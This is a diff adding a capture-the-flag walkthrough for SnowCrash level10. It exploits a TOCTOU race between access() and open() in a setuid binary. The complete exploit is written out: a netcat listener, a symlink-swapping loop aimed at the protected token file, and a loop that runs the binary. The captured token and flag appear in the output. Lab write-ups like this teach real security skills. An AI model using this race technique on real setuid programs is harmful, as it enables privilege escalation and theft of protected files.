@@ -12,3 +12,59 @@ the next two lines seems exploitable :
 ./level10 file host
     sends file to host if you have access to it
 
+-> strings level10 > output.txt
+
+-> scp -P XXXX level10@localhost:/home/user/level10/output.txt /level10/resources/
+
+when checking the readable lines in output.txt (file available in this directory),
+we can see that the executable verifies whether we have permission to read the file
+using access, then attempts to send it to a server and display its contents.
+
+Taking in account that we lack the required rights for the token file, we need to
+find a way to exploit the executable in our favor. 
+
+So, as the executable does something like :
+access(path, R_OK)
+open(path, O_RDONLY)
+
+There is a known TOCTOU (Time Of Check / Time Of Use) vulnerability.
+
+with a symbolic link: between the check and the open, let's replace the target with a
+sensitive file. Result: access() passes (on a “harmless” file), but open() reads the
+real sensitive file, and the binary sends it to us over the network (port 6969).
+
+To do so, we'll need 3 different terminal connected to the SnowCrash VM :
+
+Terminal 1 : nc -l 6969 > /tmp/capture.txt
+
+Terminal 2 : while true; do ln -sf /tmp/ok /tmp/hop; ln -sf /home/flag10/token /tmp/hop; done
+
+Terminal 3 : while true; do ./level10 /tmp/hop 127.0.0.1; done
+
+CTRL+C on each terminal
+
+-> cat /tmp/capture.txt
+
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+
+-> su flag10
+
+Password: 
+Don't forget to launch getflag !
+
+-> getflag
+
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+
+-> su level11 ..
